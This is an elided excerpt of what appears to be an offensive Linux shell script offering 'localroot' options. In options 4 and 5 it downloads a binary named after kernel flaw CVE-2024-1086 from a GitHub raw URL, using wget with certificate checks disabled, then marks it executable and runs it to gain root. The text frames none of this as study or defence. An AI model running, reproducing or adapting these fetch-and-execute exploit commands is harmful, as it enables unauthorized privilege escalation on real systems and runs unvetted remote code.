...
kernel5x=(
    ...
    https://raw.githubusercontent.com/mrwawanj/www.kern0.ru/refs/heads/master/CVE-2024-1086
...
if [ $localroot = 4 ]; then
    ...
    for kernel55 in "${kernel5x[@]}"; do
        ...
        wget -q --no-check-certificate https://raw.githubusercontent.com/mrwawanj/www.kern0.ru/refs/heads/master/CVE-2024-1086
    ...
    chmod 0755 CVE-2024-1086 && ./CVE-2024-1086
...
if [ $localroot = 5 ]; then
    ...
    wget -q --no-check-certificate https://raw.githubusercontent.com/mrwawanj/www.kern0.ru/refs/heads/master/CVE-2024-1086 && chmod 0755 CVE-2024-1086 && ./CVE-2024-1086
